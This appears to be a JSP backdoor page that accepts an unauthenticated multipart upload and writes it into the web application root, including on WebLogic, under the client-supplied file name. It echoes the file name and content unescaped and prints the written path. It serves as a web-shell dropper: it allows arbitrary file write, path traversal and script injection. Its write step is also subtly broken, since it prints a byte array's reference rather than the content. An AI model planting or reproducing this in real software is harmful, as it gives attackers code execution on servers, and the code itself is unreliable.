<%@ page import="org.apache.commons.fileupload.FileItem" %>
<%@ page import="org.apache.commons.fileupload.disk.DiskFileItemFactory" %>
<%@ page import="org.apache.commons.fileupload.servlet.ServletFileUpload" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.util.List" %>
<%@ page contentType="text/html; charset=UTF-8" %>

<%
    String method = request.getMethod();
    if ("POST".equals(method)) {
        try {
            boolean isMultipart = ServletFileUpload.isMultipartContent(request);
            if (isMultipart) {
                DiskFileItemFactory factory = new DiskFileItemFactory();
                ServletFileUpload   upload  = new ServletFileUpload(factory);
                List<FileItem>      items   = upload.parseRequest(request);
                for (FileItem item : items) {
                    String content = new String(item.get());
%>
<div>
    <p>file name: <%= item.getName() %>
    </p>
    <div><%= content %>
    </div>
</div>
<%
                String path;
                String serverInfo = application.getServerInfo();
                if (serverInfo != null && serverInfo.toLowerCase().contains("weblogic")) {
                    path = application.getResource("/").getPath() + "/" + item.getName();
                } else {
                    path = application.getRealPath("/") + "/" + item.getName();
                }
                FileOutputStream os     = new FileOutputStream(path);
                PrintWriter      writer = new PrintWriter(os);
                writer.print(content.getBytes("UTF-8"));
                writer.close();
                out.println("\n");
                out.println("写入文件 ====> " + path);
            }
        }
    } catch (Exception e) {
        out.print(e);
    }
} else {
%>

<form method="post" enctype="multipart/form-data" action="<%=request.getRequestURL() %>">
    <input type="file" name="file">
    <input type="submit">
</form>
<%
    }
%>



